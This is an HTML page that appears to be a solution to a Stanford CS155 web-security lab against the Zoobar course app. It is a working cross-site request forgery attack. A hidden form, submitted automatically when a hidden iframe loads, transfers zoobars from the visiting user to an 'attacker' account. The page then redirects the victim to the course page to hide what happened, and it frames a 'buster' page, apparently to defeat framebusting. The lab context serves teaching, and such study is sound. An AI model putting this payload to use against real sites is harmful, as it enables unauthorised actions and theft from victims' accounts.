<!DOCTYPE html>
<html>
    <head>
        <meta charset='utf-8'>
        <style type="text/css">
            #zbframe{
                width: 900px;
                height: 700px;
            }
        </style>
        <script>
            var hit=false;
            var runs=0;
            function jacked(){
                if(runs==1){
                    document.getElementById('tf').submit();
                    hit=true;
                    }else{
                    runs=runs+1;
                }
            }
            function bye(){
                if(hit){
                    window.location.replace("http://crypto.stanford.edu/cs155");
                }
            }
        </script>
    </head>
    <body> 
        <form id="tf" method="POST" name="transferform" target="cs155" action="http://zoobar.stanford.edu/transferB.php">
            <input name="zoobars" type="hidden" value="1" size="5">
            <input name="recipient" type="hidden" value="attacker">
            <input name="token" type="hidden" value="">
            <input name="submission" type="hidden" value="Send">
        </form>
        <iframe name="cs155" onload="jacked()"></iframe>
        <iframe id="zbframe" src="buster.html"></iframe>
    </body>
</html>
